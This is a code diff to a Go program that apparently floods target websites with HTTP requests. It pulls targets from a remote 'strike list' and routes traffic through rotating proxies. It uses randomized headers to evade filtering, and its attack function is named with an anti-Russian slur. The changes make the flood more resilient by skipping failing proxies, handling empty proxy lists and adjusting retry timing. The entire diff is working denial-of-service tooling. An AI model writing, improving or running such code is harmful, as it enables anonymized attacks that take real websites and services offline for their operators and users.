@@ -55,10 +55,12 @@ type proxyItem struct {
 	Ip     string
 	Auth   string
 	Scheme string
+	errCnt int32
 }
 
 const (
 	strikeRefreshInterval = 60 * time.Second
+	proxyRefreshInterval  = 30 * time.Minute
 	acceptCharset         = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
 )
 
@@ -165,7 +167,7 @@ func main() {
 	}
 
 	startProxyListRefresher(&proxyUrl)
-	startStatsPrinter(&statData, &strikeList, &refresh)
+	startStatsPrinter(&statData, &strikeList, &refresh, &ipEcho)
 
 	for {
 		time.Sleep(200 * time.Millisecond)
@@ -173,8 +175,18 @@ func main() {
 
 		go func() {
 			defer func() { <-refresher }()
-
+		P:
 			pId := atomic.LoadInt32(&currProxyListId)
+			if len(proxyList) == 0 {
+				fmt.Println("proxy list is empty... retrying...")
+				time.Sleep(time.Second)
+				return
+			}
+			if atomic.LoadInt32(&proxyList[pId].errCnt) > 10 {
+				atomicNextProxy(pId)
+				goto P
+			}
+
 			for _, strike := range strikeList {
 				limiter <- struct{}{}
 
@@ -198,12 +210,16 @@ func main() {
 				}(strike, proxyList[pId])
 			}
 
-			if pId+1 == int32(len(proxyList)) {
-				atomic.StoreInt32(&currProxyListId, 0)
-			} else {
-				atomic.AddInt32(&currProxyListId, 1)
-			}
+			atomicNextProxy(pId)
 		}()
+	}
+}
+
+func atomicNextProxy(pid int32) {
+	if pid+1 == int32(len(proxyList)) {
+		atomic.StoreInt32(&currProxyListId, 0)
+	} else {
+		atomic.AddInt32(&currProxyListId, 1)
 	}
 }
 
@@ -220,12 +236,12 @@ func fetchStrikeList(siteUrl *string) error {
 
 	req, err = http.NewRequest(http.MethodGet, *siteUrl, nil)
 	if err != nil {
-		fmt.Printf("failed to create new Request for Strike List: %v\n", err)
+		return fmt.Errorf("failed to create new Request for Strike List: %v\n", err)
 	}
 
 	resp, err = noProxyClient.Do(req)
 	if err != nil {
-		fmt.Printf("failed to execute strike List update request: %v\n", err)
+		return fmt.Errorf("failed to execute strike List update request: %v\n", err)
 	}
 	defer resp.Body.Close()
 
@@ -259,7 +275,7 @@ func fetchStrikeList(siteUrl *string) error {
 }
 
 func startStrikeListRefresher(siteUrl *string) {
-	ticker := time.NewTicker(500 * time.Millisecond)
+	ticker := time.NewTicker(time.Second)
 
 	go func() {
 		for {
@@ -280,14 +296,13 @@ func startStrikeListRefresher(siteUrl *string) {
 }
 
 func startProxyListRefresher(proxyUrl *string) {
-	fetchProxyList(proxyUrl)
-
-	ticker := time.NewTicker(15 * time.Minute)
+	ticker := time.NewTicker(time.Second)
 
 	go func() {
 		for {
 			select {
 			case <-ticker.C:
+				ticker.Stop()
 				if err := fetchProxyList(proxyUrl); err != nil {
 					fmt.Println("failed to fetch proxy List. retrying...")
 					fmt.Println(err.Error())
@@ -295,7 +310,7 @@ func startProxyListRefresher(proxyUrl *string) {
 					ticker.Reset(time.Second)
 					continue
 				}
-				ticker.Reset(1 * time.Hour)
+				ticker.Reset(proxyRefreshInterval)
 			}
 		}
 	}()
@@ -311,12 +326,12 @@ func fetchProxyList(proxyUrl *string) error {
 
 	req, err = http.NewRequest(http.MethodGet, *proxyUrl, nil)
 	if err != nil {
-		fmt.Printf("failed to create new Request for proxy List: %v\n", err)
+		return fmt.Errorf("failed to create new Request for proxy List: %v\n", err)
 	}
 
 	resp, err = noProxyClient.Do(req)
 	if err != nil {
-		fmt.Printf("failed to execute proxy List update request: %v\n", err)
+		return fmt.Errorf("failed to execute proxy List update request: %v\n", err)
 	}
 	defer resp.Body.Close()
 
@@ -353,19 +368,19 @@ func (ii *ipInfo) String() string {
 	return fmt.Sprintf("%s (%s,%s,%s,%s); %s; %s; %s", ii.Ip, ii.City, ii.Region, ii.Postal, ii.Country, ii.Loc, ii.Org, ii.Timezone)
 }
 
-func startStatsPrinter(stat *statistics, strikes *[]strikeItem, refresh *time.Duration) {
-	startIpInfoRefresher()
+func startStatsPrinter(stat *statistics, strikes *[]strikeItem, refresh *time.Duration, ii *ipInfo) {
+	startIpInfoRefresher(ii)
 
 	ticker := time.NewTicker(*refresh)
 
-	go func() {
+	go func(ii *ipInfo) {
 		for {
 			select {
 			case <-ticker.C:
 				stats := tm.NewTable(0, 8, 4, ' ', 0)
 				ct := time.Now()
 				fmt.Fprintf(stats, "Current Time: %s\n", ct.Format(time.RFC1123))
-				fmt.Fprintf(stats, "Current IP: %s\n", ipEcho.String())
+				fmt.Fprintf(stats, "Current IP: %s\n", ii.String())
 				fmt.Fprintf(stats, "Current Proxy: %s\n", proxyList[atomic.LoadInt32(&currProxyListId)].Ip)
 				fmt.Fprintf(stats, "##\tURL\tSUCC\tFAIL\tDURATION\n")
 				for i, strike := range *strikes {
@@ -393,11 +408,11 @@ func startStatsPrinter(stat *statistics, strikes *[]strikeItem, refresh *time.Du
 				tm.Flush()
 			}
 		}
-	}()
+	}(ii)
 }
 
-func startIpInfoRefresher() {
-	refreshIpInfo()
+func startIpInfoRefresher(ii *ipInfo) {
+	ii.refreshIpInfo()
 
 	ticker := time.NewTicker(15 * time.Second)
 
@@ -405,53 +420,60 @@ func startIpInfoRefresher() {
 		for {
 			select {
 			case <-ticker.C:
-				refreshIpInfo()
+				if err := ii.refreshIpInfo(); err != nil {
+					fmt.Printf("ip refresh info failed: %v\n", err.Error())
+				}
 			}
 		}
 	}()
 }
 
-func refreshIpInfo() {
+func (ii *ipInfo) refreshIpInfo() error {
 	req, err := http.NewRequest(http.MethodGet, "https://ipinfo.io/json", nil)
 	if err != nil {
-		return // err.Error()
+		// fmt.Printf("[1] req: %v\n", err.Error())
+		return err
 	}
 
 	req.Header.Set("User-Agent", ua.Random()) // FIXME: it sometimes panics. see another package?
-	req.Header.Set("Cache-Control", "no-cache")
-	req.Header.Set("Pragma", "no-cache")
+	// req.Header.Set("Cache-Control", "no-cache, no-store, max-age=0")
+	// req.Header.Set("Pragma", "no-cache")
 	req.Header.Set("Accept-Charset", acceptCharset)
 	req.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
-	req.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
 	req.Header.Set("Connection", "keep-alive")
 	req.Header.Set("Host", "ipinfo.io")
 	req.Header.Set("x-forwarded-proto", "https")
-	req.Header.Set("cf-visitor", "https")
+	// req.Header.Set("cf-visitor", "https")
 	req.Header.Set("Accept-Language", "ru")
 	req.Header.Set("Accept", "application/json, text/plain, */*")
 
-	cl, err := proxyClient(nil)
+	cl, pr, err := proxyClient(nil)
 	if err != nil {
-		fmt.Printf("proxyClient error: %v\n", err.Error())
-		return //fmt.Errorf("proxyClient error: %v\n", err.Error())
+		// fmt.Printf("proxyClient error: %v\n", err.Error())
+		return err //fmt.Errorf("proxyClient error: %v\n", err.Error())
 	}
 
 	resp, err := cl.Do(req)
 	if err != nil {
-		return // err.Error()
+		// fmt.Printf("[2] resp: %v\n", err.Error())
+		atomic.AddInt32(&pr.errCnt, 1)
+		return err // err.Error()
 	}
 	defer resp.Body.Close()
 
 	body, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
-		return // err.Error()
+		// fmt.Printf("[3] body: %v\n", err.Error())
+		atomic.AddInt32(&pr.errCnt, 1)
+		return err // err.Error()
 	}
 
-	if err := json.Unmarshal(body, &ipEcho); err != nil {
-		return // err.Error()
+	if err := json.Unmarshal(body, &ii); err != nil {
+		// fmt.Printf("[4] unmarshal: %v\n", err.Error())
+		return err // err.Error()
 	}
 
-	return // ipEcho.String()
+	return nil // ipEcho.String()
 }
 
 func russiaWarShipFuckYou(huilo strikeItem, pr proxyItem) error {
@@ -483,7 +505,7 @@ func russiaWarShipFuckYou(huilo strikeItem, pr proxyItem) error {
 	req.Header.Set("Accept-Language", "ru")
 	req.Header.Set("Accept", "application/json, text/plain, */*")
 
-	cl, err := proxyClient(&pr)
+	cl, _, err := proxyClient(&pr)
 	if err != nil {
 		fmt.Printf("proxyClient error: %v\n", err.Error())
 		return fmt.Errorf("proxyClient error: %v\n", err.Error())
@@ -519,23 +541,27 @@ func initVariables() {
 
 	refresher = make(chan struct{}, 1)
 	statData = statistics{}
+	ipEcho = ipInfo{}
 
 	ua.Random() // NOTE: init cache at this point.
 }
 
-func proxyClient(pr *proxyItem) (*http.Client, error) {
+func proxyClient(pr *proxyItem) (*http.Client, *proxyItem, error) {
 	var proxy proxyItem
 
 	if pr != nil {
 		proxy = *pr
 	} else {
+		if len(proxyList) == 0 {
+			return nil, nil, fmt.Errorf("proxyList is empty!")
+		}
 		proxy = proxyList[atomic.LoadInt32(&currProxyListId)]
 	}
 
 	cl, ok := proxyClients.Load(proxy.Ip)
 	if ok {
 		hcl := cl.(*http.Client)
-		return hcl, nil
+		return hcl, &proxy, nil
 	}
 
 	pu, err := url.Parse(proxy.Ip)
@@ -544,13 +570,13 @@ func proxyClient(pr *proxyItem) (*http.Client, error) {
 			pu, err = url.Parse("http://" + proxy.Ip)
 			if err != nil {
 				fmt.Printf("failed to parse proxy [%d]: %s\n", proxy.Id, proxy.Ip)
-				return nil, err
+				return nil, &proxy, err
 			}
 		} else {
 			pu, err = url.Parse(proxy.Scheme + "://" + proxy.Ip)
 			if err != nil {
 				fmt.Printf("failed to parse proxy [%d]: %s\n", proxy.Id, proxy.Ip)
-				return nil, err
+				return nil, &proxy, err
 			}
 		}
 	}
@@ -569,14 +595,14 @@ func proxyClient(pr *proxyItem) (*http.Client, error) {
 	}
 
 	tr := http.DefaultTransport.(*http.Transport).Clone()
-	tr.IdleConnTimeout = 10 * time.Second
+	tr.IdleConnTimeout = 15 * time.Second
 	tr.DialContext = (&net.Dialer{
-		Timeout:   5 * time.Second,
-		KeepAlive: 15 * time.Second,
+		Timeout:   10 * time.Second,
+		KeepAlive: 30 * time.Second,
 	}).DialContext
 	tr.Proxy = http.ProxyURL(pu)
 	hcl := &http.Client{Transport: tr}
 	proxyClients.Store(proxy.Ip, hcl)
 
-	return hcl, nil
+	return hcl, &proxy, nil
 }
